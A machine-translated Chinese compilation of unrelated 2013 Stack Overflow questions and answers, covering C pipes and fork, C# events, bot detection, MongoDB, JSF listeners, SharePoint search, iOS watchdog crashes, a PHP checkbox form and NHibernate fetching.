因为`UBound(cvaluePrint) = 2870`, 所以何时`Row = 2870`,超过了 for 循环最后一次迭代中`Row + 1`变体的上限。`cvaluePrint`

# c - 多个孩子从单亲读/写给单亲

> ID：15526320
> 
> 赞同：4
> 
> 时间：2013-03-20T14:27:04.133
> 
> 标签：c, process, fork, pipe

在这里，我有一个程序，其中一个父进程创建几个子进程，将一个不同的整数传递给每个子进程。然后每个子进程将读取的整数写回父进程，父进程将结果打印到标准输出：

```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>
#define R 0
#define W 1

void run_child(int in, int out){
    int r;
    int it;
    while((r = read(in, &it, sizeof(it))) != 0){
        if(r == -1){
            perror("read");
            exit(1);
        }
        //word[r] = '\0';
        int w = write(out, &it, sizeof(it));
        if(w == -1){
            perror("write");
            exit(1);
        }
        if(close(out) == -1){
            perror("close");
            exit(1);
        }
    }
}
int main(int argc, char **argv) {

    // Process fan

    int i;
    int n;
    int num_kids;
    int from_parent[2];
    int to_parent[2];

    if(argc != 2) {
        fprintf(stderr, "Usage: fan_write <numkids>\n");
        exit(1);
    }

    num_kids = atoi(argv[1]);
    int status;

    char word[32];
    for(i = 0; i < num_kids; i++) {
        if(pipe(from_parent) == -1){
            perror("pipe");
            exit(1);
        }
        if(pipe(to_parent) == -1){
            perror("pipe");
            exit(1);
        }
        int g = i;
        write(from_parent[W], &g, sizeof(int));

        n = fork();
        if(n < 0) {
            perror("fork");
            exit(1);
        }
        if(n == 0){
            if(close(from_parent[W]) == -1){
                perror("close");
                exit(1);
            }
            if(close(to_parent[R]) == -1){
                perror("close");
                exit(1);
            }
            dup2(from_parent[R], STDIN_FILENO);
            if(close(from_parent[R]) == -1){
                perror("close");
                exit(1);
            }
            run_child(STDIN_FILENO, to_parent[W]);
            close(to_parent[W]);
            exit(0);
        }

        if(close(from_parent[R]) == -1){
            perror("close");
            exit(1);
        }
        if(close(to_parent[W]) == -1){
            perror("close");
            exit(1);
        }

        if(close(from_parent[W]) == -1){
            perror("close");
            exit(1);
        }

        for(i=0;i<num_kids;i++){
            int read_int;
            int r = read(to_parent[R], &read_int, sizeof(int));
            printf("read %d bytes\n", r);
            if(r == -1){
                perror("read");
                exit(1);
            }
            printf("%d\n", read_int);
        }
    }
    for(i = 0; i < num_kids; i++){
        wait(&status);
    }

    return 0;
} 
```

使用 num_kids = 4 我希望程序每次读取 4 个字节并打印不同的整数。但是，在运行时，它在一次迭代中读取 4 个字节，然后在接下来的迭代中读取 0 个字节，并一遍又一遍地打印相同的整数。我不知道如何解决它。

**编辑：解决了！**提示：对管道使用文件描述符矩阵。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T15:31:16.927

您在循环中从所有`num_kids`子进程中读取数字的概念是错误的，您每次都从单个子进程和每个子进程中循环读取：

```
 for(i=0;i<num_kids;i++){ 
        int read_int;
        int r = read(to_parent[R], &read_int, sizeof(int));
        printf("read %d bytes\n", r);
        if(r == -1){
            perror("read");
            exit(1);
        }
        printf("%d\n", read_int);
    } 
```

是否也为每个孩子（包括父母）运行代码，因为您在子/父进程中无条件地运行此循环。但是父母可以从单个孩子那里读到你第一次获得4字节的原因`0`。因为孩子一次返回一个数字。从您的代码中删除上面的 for 循环，并按照我在下面的建议进行操作：

你应该喜欢（阅读评论）：

```
if(n == 0){
   //child
}
else{ 
  // read in parent without loop
} 
```

所以正确的方法是：

```
 if(n == 0){//child
        if(close(from_parent[W]) == -1){
            perror("close");
            exit(1);
        }
        if(close(to_parent[R]) == -1){
            perror("close");
            exit(1);
        }
        dup2(from_parent[R], STDIN_FILENO);
        if(close(from_parent[R]) == -1){
            perror("close");
            exit(1);
        }
        run_child(STDIN_FILENO, to_parent[W]);
        close(to_parent[W]);
        exit(0);
    }
    else{ // parent
       write(from_parent[W], &g, sizeof(int)); 
       int read_int;
       int r = read(to_parent[R], &read_int, sizeof(int));
        printf("read %d bytes\n", r);
        if(r == -1){
            perror("read");
            exit(1);
        }
        printf("%d\n", read_int);
    } 
```

它的工作方式如下：

```
:~$ ./a.out  4
read 4 bytes
0
read 4 bytes
1
read 4 bytes
2
read 4 bytes
3 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T02:46:57.097

```
if (n == 0) { //child
    if(close(from_parent[W]) == -1) {
        perror("close");
        exit(1);
    }
    if(close(to_parent[R]) == -1) {
        perror("close");
        exit(1);
    }
    run_child(from_parent[R], to_parent[W]);
    close(from_parent[R]);   // ignore checking return code here!
    close(to_parent[W]);     // ignore checking return code here!
    exit(0);
}

// And this is what run_child looks like
void run_child(int in, int out){
    int r;
    int it;
    while((r = read(in, &it, sizeof(it))) != 0){
        if(r == -1){
            perror("read");
            exit(1);
        }

        int w = write(out, &it, sizeof(it));
        if(w == -1){
            perror("write");
            exit(1);
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-15T07:58:22.317

我混淆了 aswers 代码，这是最终结果.. 全部成功

```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>
#define R 0
#define W 1

void run_child(int in, int out){
    int r;
    int it;
    while((r = read(in, &it, sizeof(it))) != 0){
        if(r == -1){
            perror("read");
            exit(1);
        }

        int w = write(out, &it, sizeof(it));
        //perror("write:");
        //close(out) ;

        exit(1);

    }
}
int main(int argc, char **argv) {

    // Process fan

    int i;
    int n;
    int num_kids;
    int from_parent[2];
    int to_parent[2];

    if(argc != 2) {
        fprintf(stderr, "Usage: fan_write <numkids>\n");
        exit(1);
    }

    num_kids = atoi(argv[1]);
    int status;

    char word[32];
    for(i = 0; i < num_kids; i++) {
        if(pipe(from_parent) == -1){
            perror("pipe");
            exit(1);
        }
        if(pipe(to_parent) == -1){
            perror("pipe");
            exit(1);
        }
        int g = i;
        write(from_parent[W], &g, sizeof(int));

        n = fork();
        if(n < 0) {
            perror("fork");
            exit(1);
        }

        if(n == 0){//child
            if(close(from_parent[W]) == -1){
                perror("close");
                exit(1);
            }
            if(close(to_parent[R]) == -1){
                perror("close");
                exit(1);
            }
            run_child(from_parent[R], to_parent[W]);

            if(close(from_parent[R]) == -1){
                perror("close");
                exit(1);
            }
            if(close(to_parent[W]) == -1){
                perror("close");
                exit(1);
            }

            exit(0);
        }
        else{ // parent
           write(from_parent[W], &g, sizeof(int)); 
           int read_int;
           int r = read(to_parent[R], &read_int, sizeof(int));
            printf("read %d bytes\n", r);
            if(r == -1){
                perror("read");
                exit(1);
            }
            printf("%d\n", read_int);
        }

    }

    for(i = 0; i < num_kids; i++){
        wait(&status);
    }

    return 0;
} 
```

# c++ - 打印提升::circular_buffer

> ID：15526325
> 
> 赞同：-1
> 
> 时间：2013-03-20T14:27:15.547
> 
> 标签：c++, templates, boost

我想做一个模板函数来输出 boost::circular_buffer 的内容。这是有问题的代码段：

```
template <typename T>
std::ostream& operator<<(std::ostream& os, const boost::circular_buffer<T>& cb){
   boost::circular_buffer<T>::const_iterator it;
   for(it=cb.begin(); it!=cb.end(); it++){
      os << it;
   }
   os << std::endl;
   return os;
} 
```

出现以下错误：

```
need ‘typename’ before boost::circular_buffer<T>::const_iterator’ because ‘boost::circular_buffer<T>’ is a dependent scope 
```

提前谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:32:07.720

# c# - C#如何创建一个发布订阅的事件和类的单例？

> ID：15526331
> 
> 赞同：2
> 
> 时间：2013-03-20T14:27:25.203
> 
> 标签：c#, events, event-handling

**目标：**让单例发布事件并允许任何类订阅/收听这些事件

**问题：**我无法弄清楚如何做到这一点。下面的代码是非法的，但它提供了我正在尝试做的事情

**TransmitManager 类 - 发布者**

```
 //Singleton
    public sealed class TransmitManager
    {

        delegate void TransmitManagerEventHandler(object sender);
        public static event TransmitManagerEventHandler OnTrafficSendingActive;
        public static event TransmitManagerEventHandler OnTrafficSendingInactive;

        private static TransmitManager instance = new TransmitManager();

        //Singleton
        private TransmitManager()
        {

        }

        public static TransmitManager getInstance()
        {
            return instance;
        }

        public void Send()
        {
           //Invoke Event
           if (OnTrafficSendingActive != null)
              OnTrafficSendingActive(this);

          //Code connects & sends data

          //Invoke idle event
          if (OnTrafficSendingInactive != null)
            OnTrafficSendingInactive(this);

       }
   } 
```

**测试类 - 事件订阅者**

```
 public class Test
   {

     TrasnmitManager tm = TransmitManager.getInstance();

     public Test()
     {
        //I can't do this below. What should my access level be to able to do this??

        tm.OnTrafficSendingActive += new TransmitManagerEventHandler(sendActiveMethod);

     }

     public void sendActiveMethod(object sender)
     {

        //do stuff to notify Test class a "send" event happend
     }
  } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:29:12.230

您不需要制作事件`static`。

```
public event TransmitManagerEventHandler OnTrafficSendingActive;
public event TransmitManagerEventHandler OnTrafficSendingInactive; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:30:18.370

您的事件必须是实例成员，或者您必须将它们作为静态来处理。

```
TransmitManager.OnTrafficSendingActive +=... 
```

或者

```
public event TransmitManagerEventHandler OnTrafficSendingActive;

...

TransmitManager.Instance.OnTrafficSendingActive+=... 
```

另外：使用 EventHandler 作为您的事件委托。考虑制作一个自定义参数类并将状态传递给一个事件而不是多个事件。这也可以让您传递状态消息。

# asp.net - 确定网站中的机器人

> ID：15526335
> 
> 赞同：-1
> 
> 时间：2013-03-20T14:27:35.190
> 
> 标签：asp.net, bots

为了我网站的安全，有什么方法可以区分我网站上的机器人和人类访问者？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:36:37.403

执行此操作的唯一方法可能是检查`User-Agent`当前客户端在 HTTP 请求中发送的内容。

一些机器人没有指定任何或指定一个特定的，例如*GoogleBot* (Googlebot, Mozilla/5.0) 或*百度蜘蛛*。

还有一个由[useragentstring](http://www.useragentstring.com/pages/useragentstring.php)维护的列表，其中列出了各种机器人、自动脚本或浏览器使用的所有已知用户代理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:35:16.033

并不真地。如果机器人想要被识别为机器人，是的，你可以。示例：搜索引擎机器人，如 Googlebots。

但是机器人很容易将自己识别为普通浏览器；然后你被卡住了。

如果你想要一个机器人列表，你可以去：[http ://www.robotstxt.org/db.html](http://www.robotstxt.org/db.html)

# jboss - 使用 JBoss AS 7.1 配置自定义 Infinispan 加载程序

> ID：15526336
> 
> 赞同：0
> 
> 时间：2013-03-20T14:27:35.613
> 
> 标签：jboss, jboss7.x, infinispan

我们正在将一个应用程序从 JBoss AS 6 迁移到 7。

这个新实例正在使用standalone-ha 配置文件。在之前的版本中，我们使用了一个自定义的 Infinispan 加载器，它将缓存条目存储到我们的自定义数据库中。

现在，在 JBoss 7.1 上，当尝试使用可视化管理控制台更改此配置时，它不起作用。我们在“Replicated caches”的“Store Class Impl”选项卡上键入的值并未按应有的方式存储在配置文件配置中。所以，这是我的问题：是否可以使用 xml 更改此配置？如何为我们的复制缓存配置此自定义加载程序？这里有人遇到过这种困难吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-29T10:39:58.503

不幸的是，我无法为您提供有关 JBoss 管理控制台的任何有价值的信息。

无论如何，我建议您以声明方式（使用配置 xml 文件）或以编程方式（仅在代码中使用 fluent API 构建器）为您的 Infinispan 缓存设置缓存存储/加载器。

在这里您可以找到有关存储/加载器和一些示例配置的更多详细信息：[https ://docs.jboss.org/author/display/ISPN/Cache+Loaders+and+Stores](https://docs.jboss.org/author/display/ISPN/Cache+Loaders+and+Stores)

还要考虑到在最近的 Infinispan 版本 (5.2) 中，不可能“即时”更改缓存配置。如果需要更改，您需要使用新配置重新启动服务。

（自定义 Infinispan 加载程序到底是什么意思？）

# mongodb - 如何在一个 MongoDB 查询中从 10 个类别中获取最新的 10 个帖子？

> ID：15526339
> 
> 赞同：0
> 
> 时间：2013-03-20T14:27:37.793
> 
> 标签：mongodb

我有一组文档（命名帖子），每个文档都包含一个名为 category 的字段。每个类别都是类别集合的一部分。它们的数量是固定的（比如 15 个）。

如何从每个类别中获取最后 10 个 tldr？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T04:09:44.890

另一种解决方案是在每个帖子中设置一个“标志”，这实际上是结果的一部分，例如：

```
topTen: true 
```

在该标志上定义稀疏索引将提供最快的查询 - 当然，以维护该标志为代价：

*   在插入时设置标志（影响：再更新一个索引）
*   如果在一段时间内查询返回 11 个帖子而不是 10 个是可以容忍的，则触发一个后台进程，删除（取消设置）该类别的第 11 个标志
*   如果不能容忍，在插入时查找并取消设置第 11 个标志
*   如果现有帖子的类别被更改，请确保标记设置正确（针对旧类别和新类别）
*   如果设置了标志的帖子被删除：查找并设置新的第 10 个帖子的标志
*   可能您想提供一个定期运行的进程，以确保所有标志都按应有的方式设置

有关稀疏索引的更多信息，请参阅[http://docs.mongodb.org/manual/core/indexes/#index-type-sparse](http://docs.mongodb.org/manual/core/indexes/#index-type-sparse)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:30:54.300

可能最好先获取所有类别的列表，然后通过单独的查询为每个类别获取 10 个最新帖子。

# jquery - Phonegap - 从网页打开应用并触发功能（IOS）

> ID：15526343
> 
> 赞同：1
> 
> 时间：2013-03-20T14:27:59.043
> 
> 标签：jquery, ios, cordova

是否可以从网页链接顶部打开 Phonegap IOS 应用程序 - 然后触发应用程序内的功能？

我知道可以从网页打开本机应用程序 - 但我正在努力寻找任何信息/插件，这些信息/插件将为我指明正确的方向，以使用 HTML5 Phonegap 应用程序执行此操作。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T16:45:18.530

您可以使用协议处理程序来触发 IOS 中的应用程序启动，并且从 JS 触发函数绝对是可能的。使用正确的 URL 方案，您可以向 phonegap 页面发送需要触发 js 事件的消息。使用该 JS 事件，您可以触发 obj-c 函数。

协议处理程序： [Android / iOS - 自定义 URI / 协议处理](https://stackoverflow.com/questions/11421048/android-ios-custom-uri-protocol-handling)

从 JS 触发 obj-c 函数：http: [//docs.phonegap.com/en/2.0.0/guide_plugin-development_index.md.html#Plugin%20Development%20Guide](http://docs.phonegap.com/en/2.0.0/guide_plugin-development_index.md.html#Plugin%20Development%20Guide)

# javascript - 如何获取每个选定行的下拉列表值？

> ID：15526345
> 
> 赞同：0
> 
> 时间：2013-03-20T14:28:01.033
> 
> 标签：javascript, jquery, knockout.js

我有一张看起来像这样的桌子

```
<table id="grid" class="table table-bordered table-hover table-inline">
    <thead>
        <tr>
            <th>Id</th>
            <th>Dropdown List</th>
            <th><input id="selectAll" type="checkbox" /></th>
        </tr>
    </thead>
    <tbody data-bind="foreach: stuff
        <tr>
            <td data-bind="text: someId"></td>
            <td>
                <select class="input-medium" data-bind="options: someStuff, optionsText:'DisplayName', optionsValue:'StandardCode'"></select>                           
            </td>
            <td>
                <input type="checkbox" data-bind="value: someId"/>
            </td>
        </tr>
    </tbody>
</table> 
```

然后我是我的javascript，我正在像这样迭代选定的行

```
$('grid input[type="checkbox"]:checked').each(function () {

    var someSelectedId= $(this).val();

    var dropDownlistValue= ??       
}); 
```

我正在使用敲除将我的数据绑定到表格和下拉列表。

当我遍历行时​​，如何在每行的下拉列表中获取选定的值？对于我的生活，我似乎无法弄清楚。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:36:16.770

或者...

```
$(this).closest("tr").find("select.input-medium").val(); 
```

AV 的方法可能更快，但转到 TR 允许更大的灵活性，因为无论它在行中的哪个位置，它都会找到选择。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:30:55.293

利用：

```
var dropDownlistValue = $(this).parent().prev().find('select.input-medium').val(); 
```

# joomla - Joomla 2.5 将选项组添加到文章

> ID：15526347
> 
> 赞同：1
> 
> 时间：2013-03-20T14:28:07.140
> 
> 标签：joomla, joomla2.5

我正在玩 Joomla 2.5.9（最新的 2.X 下载）。您知道如何**将其他菜单添加**到“文章管理器：编辑文章”页面吗？（这是在**管理**）

他们的 API 给了我一些关于几件事的提示，但我不知道在管理中这个正确的“向下滑动选项区域”被称为什么。

在正确的区域有诸如：

*   发布选项
*   文章选项
*   配置编辑屏幕
*   图片和链接

ETC..

我想知道从哪里开始添加我自己的，或者它们已经在系统中构建的位置，以便我可以以此为基础——这是插件、模块还是其他东西？:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:43:38.903

正如我所说，不要更改 Joomla 中的任何核心文件。如果您想在文章管理器中添加任何功能，您可以制作自己的插件以在其中添加功能。为此，请参阅此链接：

[创建内容插件](http://docs.joomla.org/Creating_a_content_plugin)

我希望这是你要找的。祝你好运。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:48:54.123

有一些扩展可以让你做到这一点。

我推荐（虽然有些错误和代码混乱）这个：

[字段附加](http://extensions.joomla.org/extensions/authoring-a-content/content-construction/18564)

它完全符合您的要求。

或者，您可以按照 Toretto 的建议自己制作，有一些关于在文章表单中为额外项目创建插件的教程，但已经制作的扩展路线似乎更有意义。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-02-25T00:43:54.707

我一直在使用 FieldsAttach 做这类事情，几年来，代码经常有点乱，这是真的，但概念是干净和雄辩的。[Brian Teeman 在https://www.youtube.com/watch?v=f2WLKWbRj5U](https://www.youtube.com/watch?v=f2WLKWbRj5U)上的演讲中从集成商的角度很好地解释了这一点，但从开发人员的角度来看，它在某些方面更具吸引力。

但是，在观看了 Marco Ding 在[https://www.youtube.com/watch?v=KDh1IPuZAVA](https://www.youtube.com/watch?v=KDh1IPuZAVA)上的 Joomla Day UK 2016 演讲后，我认为 DPFields 可能是一个更好的选择。该架构可能更加坚固和整洁，但也因为它很可能在不久的将来最终成为 Joomla 的核心扩展。有关 DPFields 的更多信息，请访问[http://extensions.joomla.org/extension/dpfields](http://extensions.joomla.org/extension/dpfields)、[https://joomla.digital-peak.com/products/dpfields](https://joomla.digital-peak.com/products/dpfields)和[https://joomla.digital-peak.com/documentation/ 162-dpfields](https://joomla.digital-peak.com/documentation/162-dpfields)。

# javascript - 如何使用 imacros 模拟鼠标悬停？

> ID：15526350
> 
> 赞同：4
> 
> 时间：2013-03-20T14:28:09.387
> 
> 标签：javascript, css, hover, imacros, mousehover

有没有办法用免费版的 imacros 模拟鼠标悬停？

有一些我想点击的元素只有在鼠标悬停时才会出现。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-20T16:52:37.127

```
TAG POS=1 TYPE=IMG ATTR=HREF:http://*.jpg CONTENT=EVENT:MOUSEOVER 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:33:14.947

如果您使用的是 Chrome 浏览器，您可以通过在 Chrome 的检查器中右键单击元素的 HTML 来强制元素处于悬停状态。

# validation - 将侦听器附加到复合组件时如何传递事件参数

> ID：15526354
> 
> 赞同：2
> 
> 时间：2013-03-20T14:28:24.710
> 
> 标签：validation, jsf, composite-component, event-listener

我尝试将事件侦听器附加到复合组件，如下所示：

```
<cc:interface>
    <cc:attribute name="listener" method-signature="void listener(javax.faces.event.ComponentSystemEvent)" />
    <cc:attribute name="value" />
</cc:interface>
<cc:implementation>
    <h:inputText value="#{cc.attrs.value}">
       <f:event type="preRenderComponent" listener="#{cc.attrs.listener}" />
    </h:inputText>
</cc:implementation> 
```

使用页面有这个：

```
 <ofc:testComp value="#{testAction.testInt}" listener="#{testAction.doWhatever}" /> 
```

和像这样的支持bean：

```
public void doWhatever(ComponentSystemEvent event) {
    System.out.println(testInt);
    System.out.println("I was here");
} 
```

这会导致 PropertyNotFoundException: `doWhatever`cannot be found on `testAction`When search the web I found [this very similar solution](https://stackoverflow.com/a/11368475/840977)。这里的主要区别是省略了 event 参数。当我在我的场景中做同样的事情时，它会起作用（我觉得这很令人困惑，因为[f:ajax](http://javaserverfaces.java.net/nonav/docs/2.0/pdldocs/facelets/f/ajax.html)和[f:event](http://javaserverfaces.java.net/nonav/docs/2.0/pdldocs/facelets/f/event.html)的文档声明监听器必须分别遵守`void listener(AjaxBehaviorEvent)`和`void listener(ComponentSystemEvent)`）

问题是：我正在尝试做所有这一切，因为我需要通过返回到事件的原始发送者`event#getComponent`所以问题是：有没有办法在这种设置中传递事件参数？

背景：我需要对一系列字段进行一些额外的验证。基本上，我想在模型更新*后*挂钩生命周期，执行一些计算，如果值不合适，可能会在调用应用程序阶段*之前中止。*违规字段需要标记。

我玩了一段时间的正常验证机制，但计算使用的是模型值，那时还没有更新。我知道，即使我让上面的代码运行，`preRenderView`停止操作也为时已晚，但我正在考虑保留一个隐藏的输入，它目前在后台完成验证失败的工作，只是将侦听器添加到实际上标记了真正的违规领域。但为此，我需要这个活动......有什么想法吗？

提前致谢。

更新：[这里的答案](https://stackoverflow.com/a/6454339/840977)使用相同的原理，但在添加参数后也会遇到问题 - 只有我得到不同的错误。

# c# - SharePoint：按名称搜索作为文档库子文件夹的文件夹

> ID：15526356
> 
> 赞同：1
> 
> 时间：2013-03-20T14:28:35.420
> 
> 标签：c#, sharepoint, service

我想搜索 SharePoint 中具有特定标题的文档库的所有子文件夹。我正在使用 service.asmx 网络服务。

不知何故它不起作用。我没有得到任何结果，也不知道如何解决这个问题。

我的代码如下所示：

```
 var service = new SharePointSearchService1.QueryService();
 service.PreAuthenticate = true;

 service.Credentials = CredentialCache.DefaultNetworkCredentials;

 var queryXml = "<?xml version=\"1.0\" encoding=\"utf-8\" ?>";
 queryXml += "<QueryPacket xmlns=\"urn:Microsoft.Search.Query\">";
 queryXml +=     "<Query>";
 queryXml +=         "<SupportedFormats>";
 queryXml +=             "<Format>urn:Microsoft.Search.Response.Folder:Folder</Format>";
 queryXml +=         "</SupportedFormats>";
 queryXml +=         "<Context>";
 queryXml +=              "<QueryText language=\"de-DE\" type=\"MSSQLFT\">SELECT Size, Rank, Path, Title, Description, Write FROM scope() WHERE  CONTAINS(Path, '\"http://sharepoint/area/test/Test Projects/*\"') </QueryText>";
 queryXml +=         "</Context>";
 queryXml +=         "<Range>";
 queryXml +=             "<StartAt>1</StartAt>";
 queryXml +=             "<Count>5000</Count>";
 queryXml +=         "</Range>";
 queryXml +=     "</Query>";
 queryXml += "</QueryPacket>";

 var result = service.Query(queryXml); 
```

上面的代码不起作用。我期望的是获取位于文档库（测试项目）内的所有项目（如文件夹）。

我可以使用以下查询搜索项目：

```
queryXml += "<QueryText language=\"de-DE\" type=\"MSSQLFT\">SELECT Size, Rank, Path, Title, Description, Write FROM scope() WHERE  CONTAINS(Title, '\"AA*\"') </QueryText>"; 
```

但这会返回整个站点的结果。我只想拥有文档库和该库的子文件夹中的项目。

我也尝试使用“like”谓词，但这也没有返回任何东西。

有人知道我做错了什么吗？

# c# - 使用 Mono.Cecil 的 .NET 程序集的目标架构

> ID：15526359
> 
> 赞同：1
> 
> 时间：2013-03-20T14:28:51.697
> 
> 标签：c#, .net-assembly, mono.cecil, bit-depth

我是否可以使用 Mono.Cecil 找到 .NET 程序集是专门为 32 位还是 64 位构建的？或任何其他无需先加载程序集的查找方式。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T15:21:47.750

使用 mono-ceci，您可以执行此操作（信息可按模块获取）：

```
AssemblyDefinition asm = AssemblyFactory.GetAssembly("myassembly.dll");

foreach (ModuleDefinition module in asm.Modules)
{
    Console.WriteLine("Module " + module.Name);
    Console.WriteLine("IsPE64 " + module.Image.PEOptionalHeader.StandardFields.IsPE64);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-07-17T09:51:49.057

`moduleDefinition.Architecture`是类型的`TargetArchitecture`女巫定义为：

```
public enum TargetArchitecture {
    I386,
    AMD64,
    IA64,
    ARMv7,
} 
```

还有另一个属性，`moduleDefinition.Attributes`类型为`ModuleAttributes`：

```
[Flags]
public enum ModuleAttributes {
    ILOnly = 1,
    Required32Bit = 2,
    StrongNameSigned = 8,
    Preferred32Bit = 0x00020000,
} 
```

# iphone - 应用程序崩溃但没有 TestFlight 崩溃报告

> ID：15526362
> 
> 赞同：3
> 
> 时间：2013-03-20T14:28:55.240
> 
> 标签：iphone, ios, objective-c

我有一位用户（使用 iPhone 5）报告说我的应用程序在屏幕变黑后大约 15 秒在启动时崩溃（启动屏幕为黑色）。用户下载了一个 TestFlight 构建，其中我在 App 委托中包含了检查点，但我没有得到这些检查点被越过的证据，而且我从来没有收到过崩溃报告。

我将故事板上的入口点更改为空白视图控制器，现在我可以看到检查点正在被越过。我突然想到，由于故事板资源加载时间过长，Watchdog 正在暂停应用程序，但所有图像都是根据需要实时构建的，除了四个小标签栏图标。有几个音频文件，但它们是按需加载的。我想不出任何其他可能导致延迟的资源。没有其他人报告过这个问题，我很困惑。

任何见解都值得赞赏，特别是关于为什么我没有看到来自 TestFlight 的崩溃报告或检查点。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-20T14:50:22.413

您的假设是正确的，看门狗杀死了该应用程序。这是因为应用程序无法正常启动，或者主线程被阻塞，或者由于没有加载 UI，因此无法进行用户交互。

据我了解您的描述，您是在加载时创建资源吗？并且可能在主线程上这样做？您应该尝试将资源匮乏的代码卸载到后台线程，而不是在较旧/较慢的设备可能需要比预期更长的时间的主线程上执行此操作。UI 应该始终响应，主线程永远不应该处理可能接近一秒处理的任务。

另一个原因可能是情节提要和视图控制器之间的链接断开了，它实际上从未加载到该设备类型上。

但如果没有更多细节，就不可能说出到底发生了什么。

一般来说：如果应用程序被iOS系统杀死，例如由于启动时间超过或由于分配过多的内存而被看门狗杀死，那么只有iOS可以生成崩溃报告。

问题是应用程序被杀死，在这种情况下进程被杀死。并且该进程内运行的任何代码都无法检测到这一点。而且由于 iOS 上的崩溃报告，除了基于 iOS 系统的崩溃报告器之外，确实在被杀死的同一应用程序进程中运行，因此它们无法报告或编写任何崩溃报告。

以下页面提供了更多详细信息：http: [//support.hockeyapp.net/kb/how-tos-faq/which-types-of-crashes-can-be-collected-on-ios-and-os- x](http://support.hockeyapp.net/kb/how-tos-faq/which-types-of-crashes-can-be-collected-on-ios-and-os-x)（尽管有 PLCrashReporter 的上下文，Testflight 不使用它。但一般陈述是相同的）

# php - 使用数组的 PHP 表单

> ID：15526366
> 
> 赞同：0
> 
> 时间：2013-03-20T14:29:01.697
> 
> 标签：php, mysql, arrays, forms, checkbox

先介绍一下我的代码：

```
<?php include ('header.php'); ?>
<h3>Extra menu items , van eigen pagina's</h3>
<!-- zet menu onderdelen aan of uit -->
<?php
    if ($_POST['submit'] == 'Verzenden') {
        $checkbox_vals = $_POST['np_menu_active_post']; // This will pass the selected checkbox values as an array

        //if(count($checkbox_vals) > 0) {
        // Loop it and update the values in DB
        foreach( $checkbox_vals as $key ){
            $updatequery = "UPDATE custompage set np_menu_active = '$key'";
            mysql_query($updatequery) or die("Couldn't get file list");
        }
    //}
?>
<meta HTTP-EQUIV="Refresh" CONTENT="0"; URL="<?php echo $_SERVER['PHP_SELF'];?>">
<?php
    }
?>

<?php
    $dbQuery_custom_toggle = "SELECT * ";

    $dbQuery_custom_toggle .= "FROM custompage";
    $result_custom_toggle = mysql_query($dbQuery_custom_toggle) or die("Couldn't get file list");
    while($row = mysql_fetch_array($result_custom_toggle)) {

        // $nptitel = $row['np_titel'];
        // $nptekst = $row['np_tekst'];

?>
<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
    <input type="hidden" name="np_menu_active_post[]" value="0" />
<?php echo $row['np_menu_titel'];?>&nbsp;<input type="checkbox" name="np_menu_active_post[]" value="1" <?php if($row['np_menu_active'] == "1"){echo 'checked="checked"';}?> />  <br />

<?php
    }
?>
    <input type="Submit" name="submit" value="Verzenden" class="btn-primary">
</form>
<!-- einde menu toggles -->
<br />
<br /> 
```

所以我试图让这个表单根据复选框将 1 值或 0 值写入 mysql db。

它部分工作，当我选择最后一个复选框时，它会检查所有内容，并将其写入数据库。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:44:51.253

通过`foreach`循环，您可以使用每个复选框在同一字段中更新您的数据库，因此最后一个复选框是唯一剩下的内容。

根据所需的结果，您需要`np_menu_active`为每个复选框设置不同的列（so），或者需要添加一个`WHERE`条件（如 Rick 所说）以使行不同。

例如，如果您想为多个用户保存复选框设置，您将为`column`每个复选框创建一个，并`row`为每个用户创建一个。

# nhibernate - NHIbernate“参考”属性生成 Select + 1 即使正确 OUTER JOINING

> ID：15526367
> 
> 赞同：1
> 
> 时间：2013-03-20T14:29:01.833
> 
> 标签：nhibernate, fluent-nhibernate-mapping

好的，我对这个 NHibernate 查询有点困惑。困惑在于 PasswordResetToken。

首先，这是映射：

```
public ContactMap()
    {
        Table("Contact");
        Id(x => x.ContactId, "ContactId").Unique().GeneratedBy.Increment();
        Map(x => x.EmailAddress);
        ...
        Map(x => x.JobTitle);

        References(x => x.PasswordResetToken, "EmailAddress")
            .PropertyRef(x => x.EmailAddress)
            .Cascade.None()
            .Not.LazyLoad()
            .Not.Update();

        HasMany(x => x.Roles)
            .Table("tblContactRole").KeyColumn("ContactId").Element("Role", part => part.Type<global::NHibernate.Type.EnumStringType<ContactRoles>>())
            .AsSet()
            .Not.LazyLoad();
    } 
```

现在这里是查询：

```
public IList<Contact> GetContacts(int id)
    {
        var contacts = Session.CreateCriteria<Contact>()
                           .Add(Restrictions.Eq("Id", id))
                           .Add(Restrictions.Eq("IsActive", true))
                           .SetFetchMode("Roles", FetchMode.Eager)
                           .SetFetchMode("PasswordResetToken", FetchMode.Eager)
                           .SetResultTransformer(CriteriaSpecification.DistinctRootEntity)
                           .List<Contact>();

        return contacts;
    } 
```

我的理解是 FetchMode.Eager 意味着使用 JOIN 而不是 SUBSELECT，因此没有任何理由出现对 db 的额外调用。

